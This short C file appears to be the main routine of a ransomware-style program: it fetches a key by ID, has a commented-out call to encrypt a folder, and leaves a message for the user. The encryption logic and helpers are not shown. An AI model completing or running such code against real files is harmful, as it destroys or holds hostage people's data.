#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "src/libcom.h"

int main (int argc, char **argv){
  int ID = 0;
  if(argc == 2){
    ID = atoi(argv[1]);
  }
  // get the key
  char* key;
  key = getKey(ID);
  // encrypt the folder
  // encDir("toEncrypt", key);
  // leave a message to the user
  leaveExplanation();
  return 0;
}
